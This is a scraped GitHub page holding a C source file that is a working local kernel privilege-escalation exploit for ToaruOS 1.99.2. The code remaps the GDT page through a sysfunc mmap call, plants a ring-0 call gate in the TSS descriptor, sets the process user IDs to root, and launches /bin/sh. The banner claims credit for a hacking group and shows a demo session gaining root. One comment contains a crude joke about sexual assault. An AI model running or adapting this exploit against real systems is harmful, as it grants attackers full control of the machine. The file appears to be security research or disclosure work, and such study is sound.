=== Content from github.com_0710ce36_20250108_133607.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmehsauce%2Fkowasuos%2Fblob%2Fmaster%2Fexploits%2Fkowasu-sysfunc-strikes-back.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmehsauce%2Fkowasuos%2Fblob%2Fmaster%2Fexploits%2Fkowasu-sysfunc-strikes-back.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mehsauce%2Fkowasuos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mehsauce](/mehsauce)
/
**[kowasuos](/mehsauce/kowasuos)**
Public

* [Notifications](/login?return_to=%2Fmehsauce%2Fkowasuos) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fmehsauce%2Fkowasuos)
* [Star
   4](/login?return_to=%2Fmehsauce%2Fkowasuos)

* [Code](/mehsauce/kowasuos)
* [Issues
  1](/mehsauce/kowasuos/issues)
* [Pull requests
  0](/mehsauce/kowasuos/pulls)
* [Actions](/mehsauce/kowasuos/actions)
* [Projects
  0](/mehsauce/kowasuos/projects)
* [Security](/mehsauce/kowasuos/security)
* [Insights](/mehsauce/kowasuos/pulse)

Additional navigation options

* [Code](/mehsauce/kowasuos)
* [Issues](/mehsauce/kowasuos/issues)
* [Pull requests](/mehsauce/kowasuos/pulls)
* [Actions](/mehsauce/kowasuos/actions)
* [Projects](/mehsauce/kowasuos/projects)
* [Security](/mehsauce/kowasuos/security)
* [Insights](/mehsauce/kowasuos/pulse)

## Files

 master
## Breadcrumbs

1. [kowasuos](/mehsauce/kowasuos/tree/master)
2. /[exploits](/mehsauce/kowasuos/tree/master/exploits)
/
# kowasu-sysfunc-strikes-back.c

 Blame  Blame
## Latest commit

## History

[History](/mehsauce/kowasuos/commits/master/exploits/kowasu-sysfunc-strikes-back.c)240 lines (213 loc) · 6.85 KB master
## Breadcrumbs

1. [kowasuos](/mehsauce/kowasuos/tree/master)
2. /[exploits](/mehsauce/kowasuos/tree/master/exploits)
/
# kowasu-sysfunc-strikes-back.c

Top
## File metadata and controls

* Code
* Blame

240 lines (213 loc) · 6.85 KB[Raw](https://github.com/mehsauce/kowasuos/raw/refs/heads/master/exploits/kowasu-sysfunc-strikes-back.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240/\* \* The Mickey Mouse Hacking Squadron proudly presents \* \* ToaruOS 1.99.2 sysfunc local kernel exploit \* \* PART III: THE MMU STRIKES BACK \* Starring \* \* Kay 'What the MMU?' Lange \* Mickey Mouse \* \* \* .-"""-. \* / . - \ \* \ / \* .-""-.,:.-\_-.< \* / \_; , / ).| \* \ ; / ` `" '\ \* '.-| ;-.\_\_\_\_, | ., \* \ `.\_~\_/ / /"/ \* ,. /`-.\_\_.-'\`-.\_ ,",' ; \* \"\ / /| o \.\_ `-.\_; / ./-. \* ; ';, / / | `\_\_ \ `-.,( / //.-' \* :\ \\;\_.-" ; |.-"` ``\ /-. /.-' \* :\ .\),.-' / }{ | '..' \* \ .-\ | , / \* '..' ;' , / \* ( \_\_ `;--;'\_\_`) \* `//'` `||` \* \_// || \* .-"-.\_,(\_\_) .(\_\_).-""-. \* / \ / \ \* \ / \ / \* `'--=="--` `--""==--'` \* \* local@livecd ~$ gcc -Wall kowasu-sysfunc-strikes-back.c -o meh \* local@livecd ~$ whoami \* local \* local@livecd ~$ ./meh \* 0@livecd /home/local# whoami \* root \* \* Tested on VMWare only. If this crashes ToaruOS, well, so does ToaruOS. \*/#include <assert.h>#include <stdio.h>#include <unistd.h>#include <inttypes.h>#include <string.h>#include <sys/sysfunc.h>#include <kernel/process.h>#include <kernel/spinlock.h>#include <kernel/arch/x86\_64/pml.h>
#define ENTRY\_MASK 0x1FF#define PAGE\_SHIFT 12#define CANONICAL\_MASK 0xFFFFFFFFFFFFULL#define HIGH\_MAP\_REGION 0xFFFFFF8000000000ULL
#define PAGE\_ALIGN(x) ((x) & ~0xFFF)#define PAGE\_ADDR(x) (((x) & CANONICAL\_MASK) >> PAGE\_SHIFT)#define PML4\_PAGE(pml, a) ((pml[PAGE\_ADDR(a) >> 27].bits.page) << PAGE\_SHIFT)#define PDP\_PAGE(pml, a) ((pml[PAGE\_ADDR(a) >> 18].bits.page) << PAGE\_SHIFT)#define PD\_PAGE(pml, a) ((pml[PAGE\_ADDR(a) >> 9].bits.page) << PAGE\_SHIFT)
struct gdtr{ uint16\_t limit; uint64\_t base;} \_\_attribute\_\_((packed));
typedef struct { uint32\_t address; uint16\_t selector;} \_\_attribute\_\_((packed)) lcall\_arg\_t;
/\* We access the GDTR from both user and kernel, so we keep it global. \*/struct gdtr g;
/\* We also access the TSS descriptor and backup from user and kernel. \*/uint8\_t \*tss;uint8\_t tss\_old[16];
static inline uint16\_tmake\_selector(int index, int ti, int rpl){ return index << 3 | ti << 2 | rpl;}
static inline voidmake\_callgate(void \*p, uint16\_t selector, uint64\_t offset, int dpl){ ((uint16\_t \*)p)[0] = offset; ((uint16\_t \*)p)[1] = selector; ((uint8\_t \*)p)[4] = 0; ((uint8\_t \*)p)[5] = 0x80 | dpl << 5 | 12; ((uint16\_t \*)p)[3] = offset >> 16; ((uint32\_t \*)p)[2] = offset >> 32; ((uint32\_t \*)p)[3] = 0;}
static inline void \*mmu\_map\_from\_physical(uintptr\_t frameaddress){ return (void \*)(frameaddress | HIGH\_MAP\_REGION);}
static inline union PML \*mmu\_get\_page(uint64\_t address){ union PML \*pml;
 /\* We take shortcuts: if the first GDT page were to suddenly have \* disappeared from the tables we're fucked like a skank on roofies \* during prom night anyway. \*/ pml = this\_core->current\_pml; pml = mmu\_map\_from\_physical(PML4\_PAGE(pml, address)); pml = mmu\_map\_from\_physical(PDP\_PAGE(pml, address)); pml = mmu\_map\_from\_physical(PD\_PAGE(pml, address)); return (union PML \*)&pml[PAGE\_ADDR(address) & ENTRY\_MASK];}
/\* Safety play. Modern times are so wordy. I really really really \* wanna push- and popa. \*/extern void callgate(void);asm ( ".global callgate\n" "callgate:\n" "swapgs\n" "push %r15\n" "push %r14\n" "push %r13\n" "push %r12\n" "push %r11\n" "push %r10\n" "push %r9\n" "push %r8\n" "push %rdi\n" "push %rsi\n" "push %rdx\n" "push %rcx\n" "push %rbx\n" "push %rax\n" "call callgate\_handler\n" "pop %rax\n" "pop %rbx\n" "pop %rcx\n" "pop %rdx\n" "pop %rsi\n" "pop %rdi\n" "pop %r8\n" "pop %r9\n" "pop %r10\n" "pop %r11\n" "pop %r12\n" "pop %r13\n" "pop %r14\n" "pop %r15\n" "swapgs\n" "lretq\n");
/\* CPL0 code. \*/void callgate\_handler(void){ union PML \*gdt\_page;
 spin\_lock(this\_core->current\_process->image.lock); this\_core->current\_process->user = 0; this\_core->current\_process->real\_user = 0;
 /\* Get the GDT base page and give it back to the kernel. This way the \* process exit routine will not free it once we exit. \*/ gdt\_page = mmu\_get\_page(PAGE\_ALIGN(g.base)); gdt\_page->bits.user = 0;
 /\* Invalidate the TLB entry for the first GDT page. \*/ asm volatile ("invlpg (%0)"::"r"(PAGE\_ALIGN(g.base)):"memory");
 /\* Restore the GDT TSS descriptor while we're at it. \*/ for (int i = 0; i < 16; i++) tss[i] = tss\_old[i];
 spin\_unlock(this\_core->current\_process->image.lock);}
int main(void){ char \*args[2];
 /\* Get the GDTR so we can target the base descriptor table. \*/ asm volatile ("sgdt %0":"=m"(g)::"memory");
 /\* Get the TSS descriptor, as we can clobber it with a callgate. TR \* caches the descriptor value, so ruining it does not really matter \* much, and we'll restore it when we're done. \*/ tss = (void \*)(g.base + 40);
 /\* Call TOARU\_SYS\_FUNC\_MMAP to remap the lower region GDT. \*  \* This was initialized in the lower ranges during multiboot, and as a \* result the higher page directories are not owned by the kernel but \* by the user. Next mmu\_frame\_allocate will conveniently set the user \* bit to 1 for us. \*/ args[0] = (char \*)PAGE\_ALIGN(g.base); args[1] = (char \*)4096; if (sysfunc(TOARU\_SYS\_FUNC\_MMAP, args) < 0) { perror("sysfunc()"); exit(EXIT\_FAILURE); }
 /\* Make a copy of the TSS descriptor for restoration later on. \*/ memcpy(tss\_old, tss, 16);
 /\* Make a CPL3 -> CPL0 callgate. Note that the kernel cs descriptor is \* at GDT index 1. \*/ make\_callgate(tss, make\_selector(1, 0, 0), (uint64\_t)callgate, 3);
 /\* Perform a far call to the callgate we set up at GDT index 5. We \* call a callgate so a 32-bit call destination is fine, as the \* destination comes from the gate descriptor anyway. \*/ lcall\_arg\_t lca = { 0, make\_selector(5, 0, 3) }; asm volatile ("lcall \*%0"::"m"(lca));
 /\* This is my boom schtick! \*/ args[0] = "/bin/sh"; args[1] = NULL; execve("/bin/sh", args, NULL);
 /\* Well, crud. \*/ perror("execve()"); exit(EXIT\_FAILURE);}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


